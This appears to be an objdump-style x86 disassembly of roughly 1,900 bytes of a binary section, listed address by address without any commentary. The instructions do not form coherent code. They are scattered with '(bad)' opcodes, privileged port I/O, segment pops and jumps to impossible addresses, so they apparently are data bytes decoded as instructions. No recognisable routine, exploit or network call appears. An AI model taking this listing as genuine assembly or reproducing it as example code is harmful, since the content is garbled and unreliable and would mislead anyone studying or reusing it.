  40782c:	int    0xd8
  40782e:	mov    BYTE PTR [ebx+0x182c7027],bh
  407834:	or     al,0xfc
  407836:	inc    eax
  407837:	fcmove st,st(6)
  407839:	cwde   
  40783a:	and    ebx,ebp
  40783c:	ficom  DWORD PTR [ebp-0x4392ad01]
  407842:	xchg   edx,eax
  407843:	dec    eax
  407844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407845:	shr    edx,cl
  407847:	fidivr DWORD PTR [eax+0x47]
  40784a:	pop    esp
  40784b:	test   eax,0xf28cf9e3
  407850:	aam    0x2a
  407852:	jo     0x407850
  407854:	leave  
  407855:	or     DWORD PTR [ecx+0x20],0x4d3ebc83
  40785c:	(bad)  
  40785d:	pop    edi
  40785e:	pop    ss
  40785f:	add    ah,BYTE PTR [eax]
  407861:	ret    0x8485
  407864:	mov    dl,0xff
  407866:	jnp    0x407805
  407868:	and    ebx,edx
  40786a:	scas   eax,DWORD PTR es:[edi]
  40786b:	in     eax,dx
  40786c:	ror    DWORD PTR [eax+ebx*1-0x54267d0b],1
  407873:	add    eax,0x2de9983
  407878:	mov    DWORD PTR ds:0x947fa515,esp
  40787e:	ret    
  40787f:	cmp    eax,0x3aab9a5c
  407884:	pop    es
  407885:	xor    al,0xac
  407887:	pop    esp
  407888:	mov    eax,0x50d67c34
  40788d:	xchg   BYTE PTR ss:0x29eacdc0,al
  407894:	cdq    
  407895:	in     eax,0x1c
  407897:	fwait
  407898:	push   eax
  407899:	lea    ecx,[edx+0x40]
  40789c:	or     cl,BYTE PTR [edx+ebp*8-0x6809e16]
  4078a3:	aas    
  4078a4:	ds and al,0x5b
  4078a7:	dec    esi
  4078a8:	dec    ebp
  4078a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078aa:	pusha  
  4078ab:	xchg   BYTE PTR [ebx],ah
  4078ad:	xor    dh,BYTE PTR [eax-0x8]
  4078b0:	and    al,0x52
  4078b2:	lock shr DWORD PTR [ecx],1
  4078b5:	pop    ebx
  4078b6:	aaa    
  4078b7:	mov    ds:0x8b6eb452,eax
  4078bc:	cwde   
  4078bd:	outs   dx,DWORD PTR ds:[esi]
  4078be:	xchg   ecx,eax
  4078bf:	cld    
  4078c0:	jnp    0x407899
  4078c2:	mov    cl,0xe7
  4078c4:	xor    eax,0x1b5233e4
  4078c9:	sub    ah,0x0
  4078cc:	jb     0x4078f6
  4078ce:	mov    bh,0x59
  4078d0:	dec    esi
  4078d1:	xchg   ebp,eax
  4078d2:	leave  
  4078d3:	push   edi
  4078d4:	sbb    al,0x3d
  4078d6:	sbb    dh,BYTE PTR [esi+ebp*1-0x20]
  4078da:	mov    esp,0xefd1e790
  4078df:	fs inc esi
  4078e1:	dec    edx
  4078e2:	xchg   DWORD PTR [edx+eax*8],ecx
  4078e5:	dec    edx
  4078e6:	xchg   edx,eax
  4078e7:	mov    dl,0xa9
  4078e9:	and    BYTE PTR [ebp+edx*1+0x1e],cl
  4078ed:	sahf   
  4078ee:	mov    edx,0xbd356df3
  4078f3:	and    al,0x44
  4078f5:	mov    ds:0x147db6fe,eax
  4078fa:	adc    eax,0x9ef3e4a7
  4078ff:	push   esp
  407900:	imul   edi,DWORD PTR [ebp+0x293a84d4],0xffffff9f
  407907:	pop    es
  407908:	in     al,dx
  407909:	push   ss
  40790a:	iret   
  40790b:	xor    BYTE PTR [edi],ch
  40790d:	test   al,0xdf
  40790f:	(bad)
  407913:	or     esp,DWORD PTR [edx-0x1]
  407916:	inc    esp
  407917:	jne    0x407907
  407919:	fnstenv [edi]
  40791b:	sbb    BYTE PTR ds:0x943bf37d,cl
  407921:	sahf   
  407922:	out    0x62,eax
  407924:	test   DWORD PTR [edi+0x59719d22],edx
  40792a:	jae    0x4078f8
  40792c:	jmp    0x85e4fdea
  407931:	fnstenv [edi+esi*1+0x5035a73a]
  407938:	and    edi,DWORD PTR [edx+0x10b91f73]
  40793e:	xlat   BYTE PTR ds:[ebx]
  40793f:	xchg   edi,eax
  407940:	mov    eax,ds:0xc625e557
  407945:	cmp    ebp,ecx
  407947:	jle    0x4078ca
  407949:	stos   BYTE PTR es:[edi],al
  40794a:	push   edx
  40794b:	jae    0x407906
  40794d:	add    BYTE PTR [ecx+edx*2+0x595485e6],bl
  407954:	ror    BYTE PTR [ebx-0x21be0d34],cl
  40795a:	sar    BYTE PTR [edi+eax*1+0x3e],0x3d
  40795f:	je     0x4078f7
  407961:	sbb    dh,BYTE PTR [eax]
  407963:	xchg   esi,eax
  407964:	adc    esi,DWORD PTR [edi+0x3e44d17f]
  40796a:	pop    ss
  40796b:	mov    esp,0x8523388c
  407970:	inc    ebx
  407971:	lds    ebp,FWORD PTR [eax+0xe]
  407974:	push   ds
  407975:	or     eax,0xc5789531
  40797a:	xchg   edx,eax
  40797b:	mov    esp,0x8ab643a8
  407980:	or     bh,ah
  407982:	out    dx,eax
  407983:	retf   
  407984:	xchg   ecx,eax
  407985:	xchg   esi,eax
  407986:	pop    esi
  407987:	jl     0x40793e
  407989:	jns    0x4079b7
  40798b:	or     DWORD PTR [edx+0x17],eax
  40798e:	gs rcr ecx,0x9d
  407992:	nop
  407993:	fs inc eax
  407995:	mov    bh,0x4e
  407997:	sub    DWORD PTR [esi+edi*4],ebx
  40799a:	mov    cl,0x66
  40799c:	inc    ebx
  40799d:	inc    DWORD PTR [ebx+0x22]
  4079a0:	adc    BYTE PTR [ebx-0x4ada501d],dl
  4079a6:	add    al,0xfe
  4079a8:	stc    
  4079a9:	leave  
  4079aa:	xor    eax,0x6be01d7e
  4079af:	call   0xf88175b8
  4079b4:	into   
  4079b5:	in     eax,0x27
  4079b7:	or     BYTE PTR [eax],0xea
  4079ba:	stos   DWORD PTR es:[edi],eax
  4079bb:	push   es
  4079bc:	call   0xfee60074
  4079c1:	inc    edi
  4079c2:	iret   
  4079c3:	jne    0x407991
  4079c5:	scas   al,BYTE PTR es:[edi]
  4079c6:	(bad)  
  4079c7:	(bad)  
  4079c8:	cmp    DWORD PTR [eax+0x152b0d29],ebx
  4079ce:	mov    bh,0xcb
  4079d0:	sbb    BYTE PTR [edi],cl
  4079d2:	std    
  4079d3:	psrld  mm6,QWORD PTR [ebx-0x95f1236]
  4079da:	or     BYTE PTR [edx-0x78],al
  4079dd:	xor    esp,edx
  4079df:	adc    BYTE PTR [ebp+0x5a],0xfc
  4079e3:	pop    ebx
  4079e4:	cmp    DWORD PTR [eax+0x46],esi
  4079e7:	mov    eax,0x866bd6c2
  4079ec:	mov    ecx,0x4352946
  4079f1:	daa    
  4079f2:	lods   eax,DWORD PTR ds:[esi]
  4079f3:	mov    eax,ds:0x3d12d00f
  4079f8:	(bad)  
  4079f9:	fimul  WORD PTR [ebp+0x1d2597e3]
  4079ff:	fcomp  QWORD PTR [edx]
  407a01:	into   
  407a02:	test   al,0xc7
  407a04:	fimul  WORD PTR [edx]
  407a06:	xor    eax,0x9dcb44a5
  407a0b:	in     al,dx
  407a0c:	adc    eax,0x2a38d925
  407a11:	mov    WORD PTR [eax],ds
  407a13:	jb     0x4079f4
  407a15:	cld    
  407a16:	outs   dx,DWORD PTR ds:[esi]
  407a17:	out    dx,al
  407a18:	imul   edx,esi,0xbebfc347
  407a1e:	jbe    0x4079b3
  407a20:	jmp    0x407a3d
  407a22:	aam    0xb2
  407a24:	adc    bl,BYTE PTR [edi-0x3]
  407a27:	or     DWORD PTR [ecx],eax
  407a29:	dec    edi
  407a2a:	mov    bl,BYTE PTR [esi+0x1e]
  407a2d:	(bad)  
  407a2e:	jnp    0x407a3d
  407a30:	test   BYTE PTR [esi+0x372ceb6a],bl
  407a36:	addr16 push esi
  407a38:	cdq    
  407a39:	rol    edx,0x40
  407a3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a3d:	xor    eax,0xea8ba534
  407a42:	das    
  407a43:	popf   
  407a44:	pmaddwd mm1,QWORD PTR [ebx+0x394f5d2c]
  407a4b:	scas   eax,DWORD PTR es:[edi]
  407a4c:	call   0xd286c2a7
  407a51:	and    BYTE PTR [edi-0x627d1245],ch
  407a57:	mov    dh,0x79
  407a59:	jnp    0x407a38
  407a5b:	into   
  407a5c:	dec    edi
  407a5d:	push   ecx
  407a5e:	bound  ebp,QWORD PTR [eax-0x76]
  407a61:	enter  0x2c6e,0x12
  407a65:	push   0xfe73c02b
  407a6a:	into   
  407a6b:	cli    
  407a6c:	aad    0xe8
  407a6e:	jp     0x407a73
  407a70:	nop
  407a71:	sub    al,0xdd
  407a73:	shr    al,1
  407a75:	xchg   dh,bh
  407a77:	xor    DWORD PTR ds:0xf8d63fad,edx
  407a7d:	int    0xa0
  407a7f:	sub    DWORD PTR [edx],ebx
  407a81:	xor    eax,0x2697c0f
  407a86:	frstor [ebp-0x6a64694b]
  407a8c:	or     cl,dh
  407a8e:	dec    esi
  407a8f:	cmp    ch,dl
  407a91:	push   es
  407a92:	cli    
  407a93:	jge    0x407ad5
  407a95:	cld    
  407a96:	div    DWORD PTR [edx+0x908a04c]
  407a9c:	pop    eax
  407a9d:	add    al,0xa9
  407a9f:	sub    ecx,ecx
  407aa1:	inc    esi
  407aa2:	lds    esi,FWORD PTR fs:[ebx]
  407aa5:	lahf   
  407aa6:	sub    eax,0x58dc026f
  407aab:	sub    al,0x30
  407aad:	sbb    bh,BYTE PTR [esi+0x35]
  407ab0:	das    
  407ab1:	pop    ds
  407ab2:	cmp    ch,BYTE PTR [esi+edi*8-0x2f]
  407ab6:	aad    0x19
  407ab8:	and    edi,DWORD PTR [edi-0x4a2f4dad]
  407abe:	sbb    eax,0xa4e79c54
  407ac3:	fisttp QWORD PTR [eax]
  407ac5:	xchg   DWORD PTR [esi+0x6e],edx
  407ac8:	(bad)  
  407ac9:	push   edx
  407aca:	pusha  
  407acb:	retf   0x6cfe
  407ace:	out    0x13,al
  407ad0:	inc    eax
  407ad1:	mov    ah,0xab
  407ad3:	in     eax,0x14
  407ad5:	stc    
  407ad6:	inc    edx
  407ad7:	jmp    0xbbb18e77
  407adc:	mov    cl,0xca
  407ade:	jnp    0x407ae2
  407ae0:	lds    esi,FWORD PTR [edx+0x7e]
  407ae3:	and    al,0x7e
  407ae6:	rcl    DWORD PTR [eax+edx*4-0x79],cl
  407aea:	int    0x4c
  407aec:	or     al,0x12
  407aee:	inc    esp
  407aef:	jno    0x407a93
  407af1:	adc    edx,DWORD PTR [ebx]
  407af3:	add    ebx,DWORD PTR [ebx]
  407af5:	pop    ebx
  407af6:	mov    ecx,0x8a8750c2
  407afb:	xor    ecx,ecx
  407afd:	cmp    al,0x4
  407aff:	sbb    BYTE PTR [esp+ecx*8-0x76],dl
  407b03:	in     eax,0xea
  407b05:	dec    esi
  407b06:	and    dl,ch
  407b08:	pop    edi
  407b09:	das    
  407b0a:	out    dx,eax
  407b0b:	mov    ecx,DWORD PTR [esi+esi*1-0x35]
  407b0f:	addr16 dec eax
  407b11:	cmp    edi,DWORD PTR [eax+0xc]
  407b14:	hlt    
  407b15:	bound  ebp,QWORD PTR [edi+0x7373b3e4]
  407b1b:	inc    esp
  407b1c:	loope  0x407b92
  407b1e:	mov    bh,0x1
  407b20:	or     al,0xa0
  407b22:	mov    edi,0x667e8114
  407b27:	shr    BYTE PTR [ecx-0x75d7e5e],1
  407b2d:	fld1   
  407b2f:	pop    ss
  407b30:	lock mov ecx,0x57972106
  407b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b37:	adc    BYTE PTR [esp+edi*2+0x76c61d44],dh
  407b3e:	neg    DWORD PTR [esi+0x76e40daf]
  407b44:	stos   BYTE PTR es:[edi],al
  407b45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b46:	sub    DWORD PTR [esi-0x3e],ecx
  407b49:	pop    eax
  407b4a:	repnz pop ss
  407b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b4d:	cmc    
  407b4e:	push   0x9e777c25
  407b53:	(bad)  
  407b54:	xor    dl,ch
  407b56:	sub    al,0xda
  407b58:	jp     0x407b10
  407b5a:	jl     0x407b5b
  407b5c:	mov    bh,0xbb
  407b5e:	pop    es
  407b5f:	aad    0x2e
  407b61:	sub    eax,0xf951fd0c
  407b66:	mov    ch,BYTE PTR [esi+0x6b]
  407b69:	gs pop edx
  407b6b:	test   al,0xbb
  407b6d:	fnstcw WORD PTR [esi+ebx*2-0x47]
  407b71:	push   eax
  407b72:	adc    esi,DWORD PTR [ebp+0x42]
  407b75:	lds    edi,FWORD PTR [ebp+0x4d6c8cc2]
  407b7b:	sub    ebp,DWORD PTR [edi+0x7053167b]
  407b81:	std    
  407b82:	sbb    DWORD PTR [ecx-0xd],esi
  407b85:	mov    DWORD PTR [ebx-0x3178d3b5],edx
  407b8b:	data16 das 
  407b8d:	ret    0x87fb
  407b90:	lods   al,BYTE PTR ds:[esi]
  407b91:	into   
  407b92:	push   0x64
  407b94:	add    BYTE PTR [edi-0x3f],bl
  407b97:	mov    ch,0x77
  407b99:	sahf   
  407b9a:	cmp    cl,BYTE PTR [ebp+0x385245ac]
  407ba0:	push   eax
  407ba1:	(bad)  
  407ba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ba3:	ror    DWORD PTR [edi+0x5460d636],0x34
  407baa:	mov    eax,0x5f876809
  407baf:	nop
  407bb0:	popf   
  407bb1:	add    esi,ecx
  407bb3:	mov    dl,0x4d
  407bb5:	mov    ds:0x86aaf1ec,al
  407bba:	scas   eax,DWORD PTR es:[edi]
  407bbb:	in     al,dx
  407bbc:	push   ebx
  407bbd:	aad    0x62
  407bbf:	pop    edi
  407bc0:	ret    
  407bc1:	pop    esp
  407bc2:	mov    ebp,0x6822366b
  407bc7:	gs test eax,0x6a1ddb03
  407bcd:	lods   eax,DWORD PTR ds:[esi]
  407bce:	pop    eax
  407bcf:	rcl    BYTE PTR [edi-0x2d916701],1
  407bd5:	repz adc al,0x95
  407bd8:	outs   dx,DWORD PTR ds:[esi]
  407bd9:	adc    dh,BYTE PTR ds:0xe4e6a684
  407bdf:	mov    bh,0xea
  407be1:	adc    esp,DWORD PTR [ebp+0x29cee84b]
  407be7:	jg     0x407c08
  407be9:	jmp    0x2d0e:0xb13eb2cc
  407bf0:	sbb    BYTE PTR [eax],ah
  407bf2:	test   BYTE PTR [edi],dh
  407bf4:	jg     0x407c28
  407bf6:	or     DWORD PTR [ebx],edi
  407bf8:	int    0x56
  407bfa:	xor    al,0x99
  407bfc:	adc    al,0x3f
  407bfe:	push   edx
  407bff:	sbb    al,BYTE PTR [ecx+0x70]
  407c02:	in     al,0xb4
  407c04:	pop    ecx
  407c05:	jnp    0x407bc5
  407c07:	imul   edi,DWORD PTR [eax-0x8e3fb5d],0xa
  407c0e:	mov    bl,0x13
  407c10:	pusha  
  407c11:	clc    
  407c12:	stos   DWORD PTR es:[edi],eax
  407c13:	pushfw 
  407c15:	inc    ebp
  407c16:	xor    DWORD PTR [esi-0x779bc404],ebx
  407c1c:	pop    eax
  407c1d:	or     DWORD PTR [ebx-0x2667608b],0x11
  407c24:	(bad)  
  407c25:	cdq    
  407c26:	dec    esp
  407c27:	push   ebx
  407c28:	cwde   
  407c29:	sub    eax,0x83ceac84
  407c2e:	outs   dx,DWORD PTR ds:[esi]
  407c2f:	xor    esp,DWORD PTR [ebp-0x461a7da4]
  407c35:	arpl   WORD PTR [ebx-0x3bcdcb36],bp
  407c3b:	pusha  
  407c3c:	retf   
  407c3d:	ret    
  407c3e:	loop   0x407c39
  407c40:	cs sub bl,ch
  407c43:	xlat   BYTE PTR ds:[ebx]
  407c44:	jno    0x407c01
  407c46:	gs fwait
  407c48:	or     eax,0x3c67490c
  407c4d:	mov    al,ds:0x9030a407
  407c52:	push   ss
  407c53:	out    dx,eax
  407c54:	ror    cl,cl
  407c56:	jbe    0x407bf3
  407c58:	cmp    DWORD PTR ds:0x47375c86,esp
  407c5e:	mov    esi,0xa89aed07
  407c63:	jg     0x407cbf
  407c65:	repz inc eax
  407c67:	enter  0x80a8,0xd5
  407c6b:	jnp    0x407c2f
  407c6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c6e:	mov    esp,DWORD PTR [eax+0x59]
  407c71:	dec    edi
  407c72:	enter  0x20af,0x7f
  407c76:	push   edi
  407c77:	push   edi
  407c78:	(bad)  
  407c79:	push   esi
  407c7a:	stc    
  407c7b:	jg     0x407c65
  407c7d:	cmp    eax,0xd1e06278
  407c83:	adc    edx,edi
  407c85:	pop    esi
  407c86:	pop    eax
  407c87:	pop    ss
  407c88:	sbb    DWORD PTR [edx+0x6],0x68
  407c8c:	xchg   edx,eax
  407c8d:	xchg   ebx,eax
  407c8e:	add    al,0xe8
  407c90:	dec    ebp
  407c91:	mov    WORD PTR [edi+0x41],ss
  407c94:	int3   
  407c95:	lods   al,BYTE PTR ds:[esi]
  407c96:	xor    BYTE PTR [ebx-0x305ee526],dl
  407c9c:	cmp    al,0xe7
  407c9e:	aaa    
  407c9f:	or     eax,0xd9382fe3
  407ca4:	adc    edi,esi
  407ca6:	lods   eax,DWORD PTR ds:[esi]
  407ca7:	jae    0x407cef
  407ca9:	clc    
  407caa:	push   ecx
  407cab:	sbb    al,0x58
  407cad:	fwait
  407cae:	lods   eax,DWORD PTR ds:[esi]
  407caf:	add    eax,0x853bec78
  407cb4:	stos   DWORD PTR es:[edi],eax
  407cb5:	test   al,0x35
  407cb7:	add    BYTE PTR [edx+0x2e52c9e0],al
  407cbd:	repnz (bad) 
  407cbf:	outs   dx,BYTE PTR ds:[esi]
  407cc0:	jns    0x407cb6
  407cc2:	jo     0x407c44
  407cc4:	and    eax,0xe861759d
  407cc9:	adc    DWORD PTR [edi],eax
  407ccb:	push   ds
  407ccc:	fstp   TBYTE PTR [ebp+0x13a895e8]
  407cd2:	into   
  407cd3:	test   eax,0xc9cf30f2
  407cd8:	adc    dl,bl
  407cda:	pop    esi
  407cdb:	fwait
  407cdc:	aaa    
  407cdd:	ss in  eax,dx
  407cdf:	push   eax
  407ce0:	leave  
  407ce1:	xor    al,0xe5
  407ce3:	loop   0x407ce5
  407ce5:	sbb    cl,BYTE PTR fs:[edx]
  407ce8:	scas   eax,DWORD PTR es:[edi]
  407ce9:	xor    edi,DWORD PTR ds:0x4625b363
  407cef:	push   esi
  407cf0:	mov    edi,0x97130e39
  407cf5:	and    BYTE PTR [ecx+0x1d],0x51
  407cf9:	retf   
  407cfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfb:	paddq  mm2,mm1
  407cfe:	push   0xf48f9cdd
  407d03:	je     0x407d64
  407d05:	jmp    0xdeb4c4b4
  407d0a:	adc    BYTE PTR [esi+0x3da4acb0],bl
  407d10:	punpckldq mm3,DWORD PTR [eax+0x5c]
  407d14:	out    dx,eax
  407d15:	in     eax,0x77
  407d17:	lea    ebx,[esi-0x62]
  407d1a:	enter  0x2c07,0x65
  407d1e:	imul   ecx,DWORD PTR [eax],0xa78c85e7
  407d24:	add    eax,0xbce279a3
  407d29:	and    ecx,edx
  407d2b:	pop    ebx
  407d2c:	sub    DWORD PTR [ecx],ebx
  407d2e:	cs mov edx,0xc6f5cd43
  407d34:	sbb    edx,edi
  407d36:	dec    ecx
  407d37:	stos   DWORD PTR es:[edi],eax
  407d38:	cmp    cl,BYTE PTR [esi-0x30]
  407d3b:	sbb    esi,DWORD PTR [edx]
  407d3d:	xchg   esi,eax
  407d3e:	mov    eax,0x9327ced6
  407d43:	xchg   ebp,eax
  407d44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d45:	xchg   ecx,eax
  407d46:	sub    ecx,DWORD PTR [edi-0x12]
  407d49:	push   edi
  407d4a:	dec    ebx
  407d4b:	and    BYTE PTR [edx-0x20e18dfc],cl
  407d51:	mov    cl,0xd6
  407d53:	xlat   BYTE PTR ds:[ebx]
  407d54:	jl     0x407d43
  407d56:	ins    BYTE PTR es:[edi],dx
  407d57:	outs   dx,BYTE PTR ds:[esi]
  407d58:	mov    al,0x0
  407d5a:	pop    edi
  407d5b:	jecxz  0x407d2f
  407d5d:	jno    0x407dae
  407d5f:	add    DWORD PTR [esi+0x0],edx
  407d62:	sbb    BYTE PTR [esi-0x3b26578c],al
  407d68:	pop    DWORD PTR [edx-0x40]
  407d6b:	push   ss
  407d6c:	dec    esp
  407d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d6e:	mov    edx,DWORD PTR [ebx]
  407d70:	mov    bl,0x8f
  407d72:	imul   eax,DWORD PTR [eax+eax*2],0xc00f4a6
  407d79:	scas   eax,DWORD PTR es:[edi]
  407d7a:	ins    BYTE PTR es:[edi],dx
  407d7b:	call   FWORD PTR [edi-0x27]
  407d7e:	cmp    BYTE PTR [eax-0x7775f5d3],dh
  407d84:	fucom  st(6)
  407d86:	push   edx
  407d87:	push   eax
  407d88:	mov    ds,eax
  407d8a:	je     0x407da4
  407d8c:	add    dh,0xbc
  407d8f:	jo     0x407dfb
  407d91:	sbb    eax,0x3bc64675
  407d96:	int    0x45
  407d98:	mov    BYTE PTR [edi],al
  407d9a:	mov    ch,0xf1
  407d9c:	mov    ebx,0x3fcc11ec
  407da1:	or     al,0xef
  407da3:	loope  0x407e1b
  407da5:	and    BYTE PTR [esi],al
  407da7:	das    
  407da8:	ret    
  407da9:	gs pop ds
  407dab:	sbb    eax,0xd4725b0e
  407db0:	xchg   esp,eax
  407db1:	dec    ecx
  407db2:	xchg   edx,eax
  407db3:	das    
  407db4:	xor    ah,dl
  407db6:	lock dec edx
  407db8:	gs repnz pop ebx
  407dbb:	inc    ebp
  407dbc:	leave  
  407dbd:	xchg   edx,eax
  407dbe:	stc    
  407dbf:	fsub   QWORD PTR [esi+0x4216f4ee]
  407dc5:	mov    ebp,0xf380f40a
  407dca:	ret    0x23c
  407dcd:	ins    DWORD PTR es:[edi],dx
  407dce:	call   0x2bfd:0xc450f0a3
  407dd5:	push   edi
  407dd6:	xor    BYTE PTR [ecx],cl
  407dd8:	mov    WORD PTR [esi-0x3],?
  407ddb:	or     DWORD PTR [esi],ecx
  407ddd:	pop    edi
  407dde:	stmxcsr DWORD PTR [ecx]
  407de1:	retf   
  407de2:	imul   eax,DWORD PTR [esi-0x2f],0xee437b2a
  407de9:	push   esi
  407dea:	jno    0x407e47
  407dec:	inc    ebx
  407ded:	lahf   
  407dee:	mov    ah,BYTE PTR [ecx-0x1]
  407df1:	dec    edi
  407df2:	mov    ds:0x6ada69cb,al
  407df7:	scas   al,BYTE PTR es:[edi]
  407df8:	fisttp QWORD PTR [ebx-0x73]
  407dfb:	push   eax
  407dfc:	retf   
  407dfd:	push   cs
  407dfe:	aas    
  407dff:	jmp    0xb4d63cc9
  407e04:	sbb    edx,DWORD PTR [edx-0x6f]
  407e07:	mov    dh,0x4d
  407e09:	xchg   ebp,eax
  407e0a:	(bad)  
  407e0c:	(bad)  
  407e0d:	mov    al,0xc9
  407e0f:	jp     0x407e65
  407e11:	dec    edi
  407e12:	pop    ebp
  407e13:	lods   eax,DWORD PTR ds:[esi]
  407e14:	pop    ebp
  407e15:	xor    BYTE PTR [edi-0x4fb65a58],bl
  407e1b:	loope  0x407e7b
  407e1d:	xchg   edx,eax
  407e1e:	jne    0x407e2f
  407e20:	fs adc edx,edx
  407e23:	(bad)  
  407e24:	xchg   ecx,eax
  407e25:	rcr    DWORD PTR [ebx+0x10],cl
  407e28:	xchg   ebx,eax
  407e29:	push   ebp
  407e2a:	xor    ah,BYTE PTR [ecx-0xa]
  407e2d:	xchg   edi,eax
  407e2e:	clc    
  407e2f:	sbb    al,0x55
  407e31:	div    BYTE PTR [ecx+0x453c1ae5]
  407e37:	dec    ebx
  407e39:	pushf  
  407e3a:	outs   dx,DWORD PTR ds:[esi]
  407e3b:	sbb    BYTE PTR [eax-0x5e404509],bh
  407e41:	daa    
  407e42:	adc    al,0xf7
  407e44:	cli    
  407e45:	iret   
  407e46:	std    
  407e47:	sbb    al,0x6a
  407e49:	adc    al,0x78
  407e4b:	cwde   
  407e4c:	call   0x24ad6e3d
  407e51:	pop    esp
  407e52:	mov    ds:0x2398fc8f,eax
  407e57:	dec    ebx
  407e58:	cmp    BYTE PTR [ebx+0x2d],ch
  407e5b:	jo     0x407e97
  407e5d:	xchg   esp,eax
  407e5e:	lods   al,BYTE PTR ds:[esi]
  407e5f:	jbe    0x407e82
  407e61:	scas   eax,DWORD PTR es:[edi]
  407e62:	arpl   WORD PTR [edx-0x12275610],di
  407e68:	out    0x48,eax
  407e6a:	mov    eax,0x772b0497
  407e6f:	pop    si
  407e71:	aam    0xb0
  407e73:	push   ds
  407e74:	inc    edi
  407e75:	xchg   esi,eax
  407e76:	aam    0x57
  407e78:	push   edx
  407e79:	iret   
  407e7a:	fidivr WORD PTR ds:0x9e10b1a8
  407e80:	inc    esp
  407e81:	addr16 push ebp
  407e83:	test   DWORD PTR [ebx-0x68f2d2c6],ecx
  407e89:	aaa    
  407e8a:	jp     0x407e98
  407e8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e8d:	add    DWORD PTR [eax+0x5c926257],esp
  407e93:	ror    eax,1
  407e95:	fs push ebx
  407e97:	cdq    
  407e98:	jle    0x407e45
  407e9a:	xchg   edi,eax
  407e9b:	idiv   DWORD PTR [edi-0x4030a30d]
  407ea1:	test   al,bh
  407ea3:	mov    ch,0xec
  407ea5:	xlat   BYTE PTR ds:[ebx]
  407ea6:	cld    
  407ea7:	mov    bl,0xef
  407ea9:	add    ebp,ebp
  407eab:	adc    dh,dl
  407ead:	sub    dh,BYTE PTR [ebp-0x2d]
  407eb0:	imul   BYTE PTR [esp+ebp*2]
  407eb3:	push   esi
  407eb4:	bound  esi,QWORD PTR [ebx+edi*4-0x2b]
  407eb8:	cmp    eax,DWORD PTR [ecx+eax*2-0x203ed779]
  407ebf:	aad    0xf3
  407ec1:	push   ebp
  407ec2:	dec    esi
  407ec3:	jo     0x407f03
  407ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ec6:	int3   
  407ec7:	rcl    DWORD PTR es:[ebx],cl
  407eca:	xchg   ecx,eax
  407ecb:	push   cs
  407ecc:	cwde   
  407ecd:	mov    edi,0xdb77948d
  407ed2:	(bad)  
  407ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed4:	xlat   BYTE PTR ds:[ebx]
  407ed5:	jg     0x407eca
  407ed7:	lds    esp,FWORD PTR [ebx-0x24]
  407eda:	sub    BYTE PTR [esi+0x4135bbf4],cl
  407ee0:	push   ds
  407ee1:	ret    
  407ee2:	and    DWORD PTR [edi+0x61],edx
  407ee5:	xor    BYTE PTR [esp+esi*8+0x8dc9a81],0x81
  407eed:	mov    eax,ds:0x14d4c49b
  407ef2:	jns    0x407e7a
  407ef4:	sbb    al,0x8d
  407ef6:	nop
  407ef7:	call   0xd008e2b7
  407efc:	mov    ah,0x11
  407efe:	xchg   DWORD PTR [ecx-0x62],eax
  407f01:	xchg   ebx,eax
  407f02:	arpl   WORD PTR [ecx+eax*8],di
  407f05:	jbe    0x407f76
  407f07:	inc    esi
  407f08:	rcl    BYTE PTR [ebx],1
  407f0a:	iret   
  407f0b:	push   eax
  407f0c:	enter  0x6e29,0xd3
  407f10:	inc    edx
  407f11:	leave  
  407f12:	xor    eax,0x60296c2
  407f17:	and    ebp,DWORD PTR [edi-0x1451594f]
  407f1d:	(bad)  
  407f1e:	int    0x16
  407f20:	pop    edi
  407f21:	pop    ebx
  407f22:	sti    
  407f23:	sbb    eax,0xeef0aaef
  407f28:	ror    DWORD PTR [edi+edi*8-0xeaac5d2],0x88
  407f30:	and    al,0x53
  407f32:	cwde   
  407f33:	dec    ebp
  407f34:	cld    
  407f35:	push   ecx
  407f36:	adc    eax,0x68cf08e0
  407f3b:	mov    cl,0xb4
  407f3d:	enter  0x17fb,0xe4
  407f41:	(bad)  
  407f43:	enter  0x18c8,0x96
  407f47:	test   ch,0x2d
  407f4a:	adc    BYTE PTR [bx+si],cl
  407f4d:	aas    
  407f4e:	(bad)  
  407f4f:	xchg   ebx,eax
  407f50:	sbb    al,0x99
  407f52:	les    eax,FWORD PTR fs:[ecx+ebx*1-0x12]
  407f57:	in     eax,dx
  407f58:	std    
  407f59:	mov    edi,0xb81f3e5b
  407f5e:	lds    ecx,FWORD PTR [ecx+0x28bb5bb6]
  407f64:	sbb    al,0x50
  407f66:	leave  
  407f67:	or     BYTE PTR [ebp-0x5],al
  407f6a:	fdivr  st,st(6)
  407f6c:	pop    esi
  407f6d:	mov    ds:0xc3a56d1f,eax
  407f72:	fidivr WORD PTR [esi+0x38c89072]
  407f78:	inc    ebp
  407f79:	adc    BYTE PTR [ecx],dl
  407f7b:	int3   
  407f7c:	fsubr  DWORD PTR [edi-0x72]
  407f7f:	sub    edx,DWORD PTR [ebx+esi*2-0x58]
  407f83:	adc    DWORD PTR [esi+0x51bcd8df],ecx
  407f89:	or     edi,DWORD PTR [ebp-0xb]
  407f8c:	or     eax,0xd1a00ae7
  407f91:	mov    DWORD PTR [edx+0x31],esi
  407f94:	test   eax,0x33a546f9
  407f99:	xor    esi,ecx
  407f9b:	xor    esi,ebx
  407f9d:	mov    WORD PTR [eax],?
  407f9f:	inc    ebx
  407fa0:	cld    
  407fa1:	aas    
  407fa2:	mov    esp,0x4e2f88cf
  407fa7:	adc    al,0x82
  407fa9:	mov    ds:0xa0da1c28,al
  407fae:	int3   
  407faf:	inc    ecx
  407fb0:	sbb    eax,0xfb117a4d
  407fb5:	popf   
  407fb6:	push   esp
  407fb7:	(bad)  
  407fb8:	mul    dh
  407fba:	push   ebp
  407fbb:	mov    esp,0xd0630be2
  407fc0:	xor    DWORD PTR [eax+eax*8],ecx
